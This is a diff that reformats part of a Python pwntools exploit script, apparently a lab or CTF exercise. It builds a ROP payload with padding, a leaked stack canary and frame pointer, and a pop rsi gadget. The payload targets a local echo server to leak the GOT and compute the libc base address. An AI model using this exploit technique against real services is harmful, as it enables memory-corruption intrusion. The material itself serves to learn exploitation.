@@ -54,14 +54,13 @@ def leak_got(bin_base=b'', canary=b'', sfp=b'', poprsi_offset=0x1601, got_offset
     write_addr = write_addr.to_bytes(length=8, byteorder='little')
 
     payload = b''
-    payload += b'A' * 264   # Padding
-    payload += canary       # Stack canary
-    payload += sfp          # Saved frame pointer
-    payload += poprsi_addr       # pop rsi; pop r15; ret address
-    payload += got_addr          # GOT address to pop into rsi
-    payload += p64(0x0)     # Junk to pop into r15
-    # Write instruction to return to (destination file descriptor set in echo, number of bytes set to 400 in echo)
-    payload += write_addr
+    payload += b'A' * 264       # Padding
+    payload += canary           # Stack canary
+    payload += sfp              # Saved frame pointer
+    payload += poprsi_addr      # pop rsi; pop r15; ret address
+    payload += got_addr         # GOT address to pop into rsi
+    payload += p64(0x0)         # Junk to pop into r15
+    payload += write_addr       # Write instruction to return to (destination file descriptor set in echo, number of bytes set in echo)
 
     # Send payload to echoserver and wait for reply
     r = remote('localhost', 2323)
@@ -130,6 +129,7 @@ if __name__ == '__main__':
     log.info(f'write() is loaded at 0x{write_addr[::-1].hex()}')
 
     # Calculate libc base address with write address and write offset
-    libc_base = (int.from_bytes(bytes=write_addr, byteorder='little') -
-                 libc.symbols['write']).to_bytes(length=8, byteorder='little')
+    libc_base = (
+        int.from_bytes(bytes=write_addr, byteorder='little') - libc.symbols['write']
+        ).to_bytes(length=8, byteorder='little')
     log.info(f'libc is loaded at 0x{libc_base[::-1].hex()}')
